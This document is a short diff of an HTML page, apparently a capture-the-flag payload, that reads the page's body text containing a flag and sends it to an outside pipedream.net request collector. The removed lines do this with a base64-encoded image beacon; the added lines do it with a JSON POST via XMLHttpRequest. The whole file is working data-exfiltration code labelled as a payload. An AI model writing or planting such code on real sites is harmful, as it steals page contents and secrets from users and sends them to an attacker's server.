@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title id="getFlag">HI</title>
+  <title id="Flag">HI</title>
 </head>
 <body>
   <p>flag</p>
 </body>
 <script>
-  document.getElementById("getFlag").innerHTML = 'Payload executed';
+  document.getElementById("Flag").innerHTML = 'Payload';
   var flagData = document.body.innerHTML;
-  var encodedFlagData = btoa(flagData); // Base64 encoding
-  var url = 'https://eoue93psy15d0ln.m.pipedream.net?data=' + encodedFlagData;
 
-  // Create an image element and set its source to trigger the request
-  var img = new Image();
-  img.src = url;
+  var payload = JSON.stringify({ data: flagData });
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://eoue93psy15d0ln.m.pipedream.net', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(payload);
 </script>
 </html>
